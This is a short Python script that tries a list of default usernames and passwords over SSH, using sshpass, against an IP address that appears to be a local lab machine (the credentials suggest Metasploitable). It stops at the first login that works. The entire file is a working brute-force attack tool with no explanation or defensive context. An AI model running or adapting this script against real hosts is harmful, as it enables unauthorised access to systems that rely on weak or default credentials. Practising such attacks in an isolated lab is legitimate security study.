import subprocess

target_ip = "192.168.56.103"
username_list = ["vagrant", "msfadmin", "user"]
password_list = ["vagrant", "msfadmin", "1234", "toor"]

for user in username_list:
    for pwd in password_list:
        print(f"[*] Trying {user}:{pwd}")
        try:
            result = subprocess.run(
                ["sshpass", "-p", pwd, "ssh", f"{user}@{target_ip}", "-o", "StrictHostKeyChecking=no", "echo success"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=5,
            )

            if b"success" in result.stdout:
                print(f"[+] Success: {user}:{pwd}")
                exit()
        except Exception as e:
            print(f"[!] Error trying {user}:{pwd} — {e}")
